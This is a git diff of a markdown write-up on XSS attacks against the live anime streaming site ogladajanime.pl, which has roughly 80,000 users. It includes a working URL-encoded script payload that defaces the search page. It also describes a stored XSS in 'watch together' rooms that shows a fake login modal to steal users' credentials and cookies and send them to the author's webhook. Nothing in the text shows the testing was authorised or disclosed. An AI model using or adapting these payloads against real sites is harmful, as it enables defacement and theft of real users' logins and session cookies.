@@ -6,19 +6,12 @@
 
 - **Target:** ogladajanime.pl
 - **Users:** ~80000
-- **Goal:** poke around for XSS, SQLi, requests, etc.
-
----
-
-## 📝 Timeline
-
-- **9 Jul 2025** – Stored XSS in “Wyszukaj anime” (only first `.` sanitized)
 
 ---
 
 ## 🔎 Findings
 
-### 1. Stored XSS in /search/name
+### 1. Reflected XSS in /search/name
 
 - **What:** Payload executes whenever someone views the search results
 - **How:** URL‑encode `<img src="…gif" onerror="…">`, add a random `.` at start
@@ -27,7 +20,7 @@
     https://ogladajanime.pl/search/name/%3Cscript%3Edocument.body.style.backgroundImage%20%3D%20%22url%28%27https%3A%2F%2Fmedia.tenor.com%2FfktkLkfB4i4AAAAM%2Fspinning-skull-skull.gif%27%29%22%3B%3C%2Fscript%3E
   - Screenshot: ![Deface demo](https://i.imgur.com/psXjU9g.png)
 
-### 2. Fake‑Login Cookie Grabber
+### 2. Stored XSS in watch togheter rooms
 
 - **What:** Crafted a modal that looks like real login, steals creds + cookies to my Vercel webhook
 - **Where:** watch togheter section
@@ -45,4 +38,5 @@ All my full payloads are in [`payloads`](./payloads/payloads.txt).
 
     Payload list & links: see payloads.txt
     Room‑creation XSS proof: https://imgur.com/a/sxjHl5B
+
 
